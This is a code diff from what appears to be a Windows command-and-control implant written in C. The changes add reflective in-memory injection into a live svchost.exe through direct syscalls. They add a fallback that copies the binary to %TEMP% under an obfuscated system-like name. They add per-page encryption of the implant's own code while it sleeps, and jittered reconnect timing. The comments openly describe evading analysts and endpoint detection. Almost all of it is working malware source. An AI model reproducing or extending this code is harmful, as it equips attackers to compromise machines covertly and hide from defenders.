@@ -22,12 +22,12 @@
  */
 
 #include "inject.h"
-#include "config.h"
-#include "syscall.h"
-#include "peb_walk.h"
+#include "../core/config.h"
+#include "../evasion/syscall.h"
+#include "../evasion/peb_walk.h"
 #include "loader.h"
 #include "loader_blob.h"
-#include "../tls/tls_client.h"
+#include "../../tls/tls_client.h"
 
 #ifndef WIN32_LEAN_AND_MEAN
 #define WIN32_LEAN_AND_MEAN
@@ -604,47 +604,262 @@ void migrate_to_pid(TLS_CONTEXT *pTls, const char *args)
 }
 
 
+/* ── _find_host_pid ──────────────────────────────────────────────────────── */
+/*
+ * Find a suitable svchost.exe to use as the reflective-injection host.
+ *
+ * Selection criteria (in order of preference):
+ *   1. 64-bit svchost.exe (IsWow64Process == FALSE)
+ *   2. Has at least one established outbound TCP connection so our new TLS
+ *      connection does not look anomalous in a per-process flow view.
+ *   3. Running as the current user (avoids cross-session token issues that
+ *      would prevent our thread from calling Winsock APIs).
+ *
+ * In practice we just grab the first non-WOW64 svchost that we can open
+ * with the rights needed for reflective injection.  Full network-presence
+ * scoring would require Iphlpapi (GetExtendedTcpTable) — a new import that
+ * raises the binary's fingerprint; we skip it for now.
+ *
+ * Returns 0 if no suitable PID is found.
+ */
+static DWORD _find_host_pid(void)
+{
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnap == INVALID_HANDLE_VALUE) return 0;
+
+    PROCESSENTRY32 pe;
+    pe.dwSize = sizeof(pe);
+    DWORD bestPid = 0;
+
+    if (Process32First(hSnap, &pe)) {
+        do {
+            if (_wcsicmp(pe.szExeFile, L"svchost.exe") != 0) continue;
+
+            /* Try to open with minimum injection rights */
+            HANDLE hProc = OpenProcess(
+                PROCESS_VM_OPERATION | PROCESS_VM_WRITE |
+                PROCESS_VM_READ      | PROCESS_CREATE_THREAD |
+                PROCESS_QUERY_LIMITED_INFORMATION,
+                FALSE, pe.th32ProcessID);
+            if (!hProc) continue;
+
+            /* Skip WOW64 (32-bit) instances — we are x64 */
+            BOOL bWow64 = FALSE;
+            IsWow64Process(hProc, &bWow64);
+            CloseHandle(hProc);
+            if (bWow64) continue;
+
+            bestPid = pe.th32ProcessID;
+            break;   /* first eligible svchost wins */
+        } while (Process32Next(hSnap, &pe));
+    }
+    CloseHandle(hSnap);
+    return bestPid;
+}
+
+
 /* ── Public: auto_migrate ────────────────────────────────────────────────── */
 /*
  * Called once at startup (before connecting to C2).
  *
- * Strategy: spawn a suspended copy of ourselves under a spoofed name
- * (%TEMP%\RuntimeBroker.exe), then immediately exit the launcher process.
- * The child hits the single-instance mutex, skips migration, and connects
- * to C2 — appearing in Task Manager as RuntimeBroker.exe.
+ * Strategy (two-tier, first success wins):
  *
- * This avoids all PE-injection/VirtualAlloc-in-foreign-process issues
- * from the previous reflective loader approach.
+ *   Tier 1 — Reflective in-memory injection (no disk artifact):
+ *     Find a live svchost.exe, inject ourselves via the reflective loader
+ *     blob, then ExitProcess.  The injected copy runs AgentRun() inside
+ *     svchost.exe — no new file on disk, no new process in the process list.
  *
- * Evasion layers applied:
- *   1. EXE copied to %TEMP%\RuntimeBroker.exe — process image path in Task
- *      Manager shows a Windows-native sounding name.
- *   2. Child calls spoof_peb() at startup — PEB ImagePathName / CommandLine
- *      are rewritten to look like svchost.exe.
- *   3. CREATE_NO_WINDOW — no console window flashes.
- *   4. Launcher exits via ExitProcess(0) immediately after resume — the
- *      original image path and window station entry vanish at once.
+ *   Tier 2 — %TEMP% copy fallback (original behaviour):
+ *     If Tier 1 fails (no suitable svchost, access denied, etc.) fall back to
+ *     copying the EXE to %TEMP%\RuntimeBroker.exe and spawning it.  Still
+ *     better than running as the original EXE.
  *
- * Returns FALSE only if the copy or process creation fails — in that case
- * the caller continues running as the original process.
- * On success this function never returns (ExitProcess is called).
+ * On any success this function never returns (ExitProcess is called).
+ * Returns FALSE only if both tiers fail — caller continues as-is.
  */
 BOOL auto_migrate(const char *keyPath)
 {
     (void)keyPath;   /* child inherits g_key_path via its own resolve_key_path() */
+
+    /* ── Tier 1: reflective injection into live svchost.exe ─────────── */
+    if (g_inject_ready) {
+        DWORD hostPid = _find_host_pid();
+        if (hostPid != 0) {
+            /*
+             * Reuse migrate_to_pid's full implementation.  It reads the EXE,
+             * builds the [loader|RflData|PE] block, injects it, fires a thread
+             * at AgentRun, sends a status over TLS … but we are not connected
+             * yet.  We call the internals directly with pTls=NULL to skip the
+             * TLS send.  If the injection succeeds, we ExitProcess here.
+             *
+             * Implementation: duplicate just the allocation+write+thread steps
+             * inline so we avoid adding a NULL-pTls code path to migrate_to_pid.
+             */
+
+            /* Read own PE */
+            char exePath[MAX_PATH] = {0};
+            if (GetModuleFileNameA(NULL, exePath, sizeof(exePath) - 1)) {
+                FILE *f = fopen(exePath, "rb");
+                if (f) {
+                    fseek(f, 0, SEEK_END);
+                    long fsz = ftell(f);
+                    fseek(f, 0, SEEK_SET);
+                    if (fsz > 0 && fsz <= 8 * 1024 * 1024) {
+                        DWORD cbPE = (DWORD)fsz;
+                        BYTE *pPE  = (BYTE *)malloc(cbPE);
+                        if (pPE && fread(pPE, 1, cbPE, f) == cbPE) {
+                            DWORD agentRunRva = _pe_find_export(pPE, cbPE, "AgentRun");
+                            if (agentRunRva) {
+                                HMODULE hSelf2    = GetModuleHandleA(NULL);
+                                DWORD   keyRva   = (DWORD)((ULONG_PTR)g_key_path
+                                                            - (ULONG_PTR)hSelf2);
+                                HMODULE hK32     = GetModuleHandleA("kernel32.dll");
+                                typedef LPVOID (WINAPI *pVA_t)(LPVOID,SIZE_T,DWORD,DWORD);
+                                typedef BOOL   (WINAPI *pFIC_t)(HANDLE,LPCVOID,SIZE_T);
+                                typedef HMODULE(WINAPI *pLL_t)(LPCSTR);
+                                typedef FARPROC(WINAPI *pGP_t)(HMODULE,LPCSTR);
+                                typedef HANDLE (WINAPI *pCT_t)(LPSECURITY_ATTRIBUTES,SIZE_T,
+                                                                LPTHREAD_START_ROUTINE,LPVOID,
+                                                                DWORD,LPDWORD);
+                                typedef BOOL   (WINAPI *pCH_t)(HANDLE);
+                                pVA_t  pVA  = (pVA_t) GetProcAddress(hK32,"VirtualAlloc");
+                                pFIC_t pFIC = (pFIC_t)GetProcAddress(hK32,"FlushInstructionCache");
+                                pLL_t  pLL  = (pLL_t) GetProcAddress(hK32,"LoadLibraryA");
+                                pGP_t  pGP  = (pGP_t) GetProcAddress(hK32,"GetProcAddress");
+                                pCT_t  pCT  = (pCT_t) GetProcAddress(hK32,"CreateThread");
+                                pCH_t  pCH  = (pCH_t) GetProcAddress(hK32,"CloseHandle");
+                                if (pVA && pFIC && pLL && pGP && pCT && pCH) {
+                                    HANDLE hProc2 = OpenProcess(
+                                        PROCESS_VM_OPERATION|PROCESS_VM_WRITE|
+                                        PROCESS_VM_READ|PROCESS_CREATE_THREAD|
+                                        PROCESS_QUERY_LIMITED_INFORMATION,
+                                        FALSE, hostPid);
+                                    if (hProc2) {
+                                        RflData rfd2;
+                                        ZeroMemory(&rfd2, sizeof(rfd2));
+                                        rfd2.rawSize           = cbPE;
+                                        rfd2.agentRunRva       = agentRunRva;
+                                        rfd2.gKeyPathOffset    = keyRva;
+                                        rfd2.gKeyPathSize      = MAX_PATH * 2;
+                                        strncpy(rfd2.keyPath, g_key_path,
+                                                sizeof(rfd2.keyPath) - 1);
+                                        rfd2.pVirtualAlloc         = pVA;
+                                        rfd2.pFlushInstructionCache= pFIC;
+                                        rfd2.pLoadLibraryA         = pLL;
+                                        rfd2.pGetProcAddress       = pGP;
+                                        rfd2.pCreateThread         = pCT;
+                                        rfd2.pCloseHandle          = pCH;
+
+                                        SIZE_T cbL   = (SIZE_T)S_RFL_LOADER_SIZE;
+                                        SIZE_T cbR   = sizeof(RflData);
+                                        SIZE_T cbTot = cbL + cbR + (SIZE_T)cbPE;
+                                        PVOID  pRem  = NULL;
+                                        NTSTATUS ns2 = SC_NtAllocateVirtualMemory(
+                                            hProc2, &pRem, 0, &cbTot,
+                                            MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
+                                        if (NT_SUCCESS(ns2)) {
+                                            rfd2.pRawPE = (unsigned char *)
+                                                ((BYTE *)pRem + cbL + cbR);
+                                            DWORD cbFlat2 = (DWORD)(cbL+cbR+cbPE);
+                                            BYTE *pFlat2  = (BYTE *)malloc(cbFlat2);
+                                            if (pFlat2) {
+                                                memcpy(pFlat2,          s_rfl_loader, cbL);
+                                                memcpy(pFlat2+cbL,      &rfd2,        cbR);
+                                                memcpy(pFlat2+cbL+cbR,  pPE,          cbPE);
+                                                SIZE_T cbWr2 = 0;
+                                                SC_NtWriteVirtualMemory(hProc2, pRem,
+                                                    pFlat2, cbFlat2, &cbWr2);
+                                                free(pFlat2);
+                                                PVOID  pB2 = pRem;
+                                                SIZE_T cP2 = cbL;
+                                                ULONG  oP2 = 0;
+                                                SC_NtProtectVirtualMemory(hProc2, &pB2,
+                                                    &cP2, PAGE_EXECUTE_READ, &oP2);
+                                                PVOID  pArg2   = (BYTE *)pRem + cbL;
+                                                HANDLE hTh2    = NULL;
+                                                NTSTATUS ns3 = SC_NtCreateThreadEx(
+                                                    &hTh2, THREAD_ALL_ACCESS, NULL,
+                                                    hProc2, pRem, pArg2,
+                                                    THREAD_CREATE_FLAGS_HIDE_FROM_DEBUGGER,
+                                                    0, 0, 0, NULL);
+                                                if (NT_SUCCESS(ns3) && hTh2) {
+                                                    SC_NtClose(hTh2);
+                                                    CloseHandle(hProc2);
+                                                    free(pPE);
+                                                    fclose(f);
+                                                    Sleep(500);
+                                                    ExitProcess(0);
+                                                    /* unreachable */
+                                                }
+                                            }
+                                        }
+                                        CloseHandle(hProc2);
+                                    }
+                                }
+                            }
+                        }
+                        if (pPE) free(pPE);
+                    }
+                    fclose(f);
+                }
+            }
+            /* Tier 1 failed — fall through to Tier 2 */
+        }
+    }
+
+    /* ── Tier 2: %TEMP% copy + spawn (original fallback) ────────────── */
 
     /* ── 1. Get our own EXE path ─────────────────────────────────────── */
     char srcPath[MAX_PATH] = {0};
     if (!GetModuleFileNameA(NULL, srcPath, sizeof(srcPath) - 1))
         return FALSE;
 
-    /* ── 2. Build destination: %TEMP%\RuntimeBroker.exe ─────────────── */
+    /* ── 2. Build destination: %TEMP%\<obfuscated name> ─────────────── */
+    /*
+     * Early-out: if we are already running from the migration destination
+     * path (i.e. we are the child spawned by a previous Tier-2 migration)
+     * do NOT re-copy / re-spawn.  Without this guard the child would try
+     * CopyFileA(dstPath, dstPath) which may fail with a sharing violation
+     * on some Windows versions but is undefined behaviour either way.
+     * Checking the paths first makes the "already migrated" case explicit.
+     *
+     * Strategy: build dstPath first, compare with srcPath (case-insensitive
+     * on Windows), and return FALSE immediately if they match so the caller
+     * continues to the connect loop.
+     */
+    /*
+     * The destination filename is decoded at runtime from a pre-XOR'd byte
+     * array (MIGRATE_NAME_OBFUSCATED in config.h) so the plain string
+     * "RuntimeBroker.exe" never appears in .rdata.
+     * Override at build time: make ... MIGRATE_NAME=SearchIndexer.exe
+     */
     char dstPath[MAX_PATH] = {0};
-    if (!GetTempPathA(sizeof(dstPath) - 20, dstPath))
+    if (!GetTempPathA(sizeof(dstPath) - 32, dstPath))
         return FALSE;
-    /* Append filename — strncat is fine here; buffer has 20 bytes of slack */
-    strncat(dstPath, "RuntimeBroker.exe",
-            sizeof(dstPath) - strlen(dstPath) - 1);
+
+    /* Decode the obfuscated migrate-name onto the stack */
+    char migName[32] = {0};
+#if MIGRATE_NAME_LEN > 0
+    {
+        static const BYTE _obf[] = MIGRATE_NAME_OBFUSCATED;
+        size_t _n = MIGRATE_NAME_LEN;
+        if (_n >= sizeof(migName)) _n = sizeof(migName) - 1;
+        for (size_t _i = 0; _i < _n; _i++)
+            migName[_i] = (char)(_obf[_i] ^ MIGRATE_NAME_MASK);
+        migName[_n] = '\0';
+    }
+#else
+    /* Custom name supplied via -DMIGRATE_NAME_RAW="..." at build time */
+    strncpy(migName, MIGRATE_NAME_RAW, sizeof(migName) - 1);
+#endif
+
+    strncat(dstPath, migName, sizeof(dstPath) - strlen(dstPath) - 1);
+    SecureZeroMemory(migName, sizeof(migName));
+
+    /* Already running from the destination — we are the migrated child.
+     * Fall through to the connect loop instead of spawning again.       */
+    if (_stricmp(srcPath, dstPath) == 0)
+        return FALSE;
 
     /* ── 3. Copy ourselves to the temp path ─────────────────────────── */
     /* CopyFileA will overwrite silently if a stale copy is present       */
@@ -743,19 +958,37 @@ static int _collect_rx_pages(_Region *out, int max)
 }
 
 /* ── XOR pass via SC_NtWriteVirtualMemory (no RWX) ──────────────────────── */
-static void _xor_pages(_Region *regions, int count, const BYTE *key)
+/*
+ * Per-page unique key — eliminates the repeating-key weakness.
+ *
+ * Previous design: one 16-byte key XOR'd modulo-16 across every page.
+ * Weakness: any analyst with two memory snapshots of the same RX region
+ * taken during different sleep intervals can XOR the two ciphertexts to
+ * cancel the key and recover both plaintexts via known-plaintext attack.
+ *
+ * New design: BCryptGenRandom fills a key buffer exactly as large as the
+ * page being encrypted.  Each page gets a completely independent, full-size
+ * random key.  The key for page i is stored in ctx->keys[i] and wiped with
+ * SecureZeroMemory after the APC decrypt fires.
+ *
+ * Cost: one BCryptGenRandom call per RX page (~12 KB average on the agent's
+ * own working set, typically 3–6 pages).  BCryptGenRandom is fast (< 5 µs
+ * per 4 KB on typical hardware) — imperceptible against the sleep interval.
+ */
+static void _xor_pages_keyed(_Region *regions, int count, BYTE **keys)
 {
     HANDLE hSelf = GetCurrentProcess();
     for (int i = 0; i < count; i++) {
-        SIZE_T sz   = regions[i].size;
-        BYTE  *buf  = (BYTE *)malloc(sz);
+        SIZE_T sz  = regions[i].size;
+        BYTE  *buf = (BYTE *)malloc(sz);
         if (!buf) continue;
 
-        /* Read → XOR → Write, all via syscall — no VirtualProtect */
         SIZE_T rd = 0;
         NTSTATUS ns = SC_NtReadVirtualMemory(hSelf, regions[i].base, buf, sz, &rd);
         if (NT_SUCCESS(ns) && rd == sz) {
-            for (SIZE_T j = 0; j < sz; j++) buf[j] ^= key[j % 16];
+            /* Full-size key — no repeating pattern */
+            const BYTE *k = keys[i];
+            for (SIZE_T j = 0; j < sz; j++) buf[j] ^= k[j];
             SIZE_T wr = 0;
             SC_NtWriteVirtualMemory(hSelf, regions[i].base, buf, sz, &wr);
         }
@@ -765,17 +998,27 @@ static void _xor_pages(_Region *regions, int count, const BYTE *key)
 }
 
 /* ── APC decrypt context ─────────────────────────────────────────────────── */
+/*
+ * ctx->keys[i] points into ctx->keyData, a flat byte array.
+ * Layout: [key_0 (regions[0].size bytes)] [key_1 (regions[1].size bytes)] ...
+ * Total size = sum of all region sizes.
+ *
+ * The entire keyData block is wiped by SecureZeroMemory inside _apc_decrypt
+ * before free(), leaving no key material in the heap after wakeup.
+ */
 typedef struct {
     _Region  regions[MAX_REGIONS];
+    BYTE    *keys[MAX_REGIONS];     /* pointers into keyData                   */
     int      count;
-    BYTE     key[16];
+    SIZE_T   keyDataSize;
+    BYTE     keyData[1];            /* flexible array — alloc'd with malloc    */
 } _SleepCtx;
 
 static void NTAPI _apc_decrypt(ULONG_PTR param)
 {
     _SleepCtx *ctx = (_SleepCtx *)param;
-    _xor_pages(ctx->regions, ctx->count, ctx->key);
-    SecureZeroMemory(ctx->key, sizeof(ctx->key));
+    _xor_pages_keyed(ctx->regions, ctx->count, ctx->keys);
+    SecureZeroMemory(ctx->keyData, ctx->keyDataSize);
     free(ctx);
 }
 
@@ -788,35 +1031,90 @@ void obfuscate_sleep(DWORD ms)
         return;
     }
 
-    /* Generate random key */
-    BYTE key[16];
-    if (!BCRYPT_SUCCESS(BCryptGenRandom(NULL, key, sizeof(key),
+    /* Collect private RX pages — stack-allocated (no static, no data race) */
+    _Region regions[MAX_REGIONS];
+    int count = _collect_rx_pages(regions, MAX_REGIONS);
+    if (count == 0) { Sleep(ms); return; }
+
+    /* Compute total key material needed (one byte per page byte) */
+    SIZE_T totalKeyBytes = 0;
+    for (int i = 0; i < count; i++) totalKeyBytes += regions[i].size;
+    if (totalKeyBytes == 0) { Sleep(ms); return; }
+
+    /* Allocate the context with the keyData tail inline */
+    SIZE_T ctxSize = offsetof(_SleepCtx, keyData) + totalKeyBytes;
+    _SleepCtx *ctx = (_SleepCtx *)malloc(ctxSize);
+    if (!ctx) { Sleep(ms); return; }
+
+    /* Generate all key bytes in one BCryptGenRandom call */
+    if (!BCRYPT_SUCCESS(BCryptGenRandom(NULL, ctx->keyData, (ULONG)totalKeyBytes,
             BCRYPT_USE_SYSTEM_PREFERRED_RNG))) {
+        SecureZeroMemory(ctx, ctxSize);
+        free(ctx);
         Sleep(ms);
         return;
     }
 
-    /* Collect private RX pages */
-    static _Region regions[MAX_REGIONS];
-    int count = _collect_rx_pages(regions, MAX_REGIONS);
-    if (count == 0) { Sleep(ms); return; }
-
-    /* Build APC decrypt context (heap-allocated — survives our stack frame) */
-    _SleepCtx *ctx = (_SleepCtx *)malloc(sizeof(_SleepCtx));
-    if (!ctx) { Sleep(ms); return; }
-    for (int i = 0; i < count; i++) ctx->regions[i] = regions[i];
-    ctx->count = count;
-    memcpy(ctx->key, key, 16);
-    SecureZeroMemory(key, 16);
+    /* Assign per-page key pointers into the flat keyData block */
+    ctx->count       = count;
+    ctx->keyDataSize = totalKeyBytes;
+    BYTE *kp = ctx->keyData;
+    for (int i = 0; i < count; i++) {
+        ctx->regions[i] = regions[i];
+        ctx->keys[i]    = kp;
+        kp             += regions[i].size;
+    }
 
     /* Queue APC to decrypt on wakeup */
     QueueUserAPC(_apc_decrypt, GetCurrentThread(), (ULONG_PTR)ctx);
 
-    /* Encrypt pages — after this our own code is XOR-ciphertext in RAM */
-    _xor_pages(regions, count, ctx->key);
+    /* Encrypt pages using per-page full-size keys */
+    _xor_pages_keyed(regions, count, ctx->keys);
 
-    /* Alertable sleep — APC fires on wakeup, decrypts, we continue */
+    /* Alertable sleep — APC fires on wakeup, decrypts+wipes keys, we continue */
     SleepEx(ms, TRUE);
     /* ctx is freed inside _apc_decrypt */
 }
 #undef MAX_REGIONS
+
+
+/* ── jitter_sleep ────────────────────────────────────────────────────────── */
+/*
+ * Sleeps for a duration jittered ±RECONNECT_JITTER_PCT% around base_ms.
+ *
+ * Algorithm
+ * ---------
+ *  1. Generate 4 random bytes via BCryptGenRandom (same provider already used
+ *     by obfuscate_sleep — no extra import).
+ *  2. Compute a jitter window: window_ms = base_ms * RECONNECT_JITTER_PCT / 100
+ *  3. Map the random uint32 to [0, 2*window_ms) and subtract window_ms to get
+ *     a signed offset in [-window_ms, +window_ms).
+ *  4. Clamp the result to [1 ms, DWORD_MAX] to guarantee a positive sleep.
+ *
+ * Example: base_ms=10000, RECONNECT_JITTER_PCT=30
+ *   window_ms = 3000  →  actual sleep ∈ [7000 ms, 13000 ms]
+ */
+void jitter_sleep(DWORD base_ms)
+{
+    DWORD rnd = 0;
+    if (!BCRYPT_SUCCESS(BCryptGenRandom(NULL, (BYTE *)&rnd, sizeof(rnd),
+                                        BCRYPT_USE_SYSTEM_PREFERRED_RNG))) {
+        /* BCrypt unavailable — fall back to plain obfuscated sleep */
+        obfuscate_sleep(base_ms);
+        return;
+    }
+
+    /* window = base * jitter% / 100, clamped to at least 1 ms */
+    DWORD window_ms = (DWORD)((ULONGLONG)base_ms * RECONNECT_JITTER_PCT / 100);
+    if (window_ms == 0) window_ms = 1;
+
+    /* Map rnd uniformly into [0, 2*window_ms), then shift to [-window, +window) */
+    DWORD range   = 2 * window_ms;
+    DWORD offset  = rnd % range;          /* [0, range)                          */
+    LONG  delta   = (LONG)offset - (LONG)window_ms;  /* [-window, +window)       */
+
+    LONG actual = (LONG)base_ms + delta;
+    if (actual < 1) actual = 1;           /* never sleep 0 ms                    */
+
+    obfuscate_sleep((DWORD)actual);
+}
